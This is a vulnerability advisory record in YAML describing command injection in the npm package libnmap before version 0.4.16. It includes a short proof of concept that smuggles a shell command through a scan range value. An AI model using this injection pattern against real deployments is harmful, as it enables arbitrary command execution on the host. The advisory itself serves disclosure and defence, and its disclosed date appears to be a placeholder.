- id: npmjs:npm:libnmap:719
  title: Command Injection
  description: "Versions of `libnmap` before 0.4.16 are vulnerable to command injection.
    \n\nProof of concept\n\n```\nconst nmap = require('libnmap');\nconst opts = {\n
    \   range: [\n        'scanme.nmap.org',\n        \"x.x.$(touch success.txt)\"\n
    \   ]\n};\nnmap.scan(opts, function(err, report) {\n    if (err) throw new Error(err);\n\n
    \   for (let item in report) {\n        console.log(JSON.stringify(report[item]));\n
    \   }\n});\n```"
  affected_package: libnmap
  vulnerable_versions:
  - "<=0.4.15"
  severity: medium
  package_manager: npm
  cwe: CWE-78
  disclosed_date: 1970-01-01
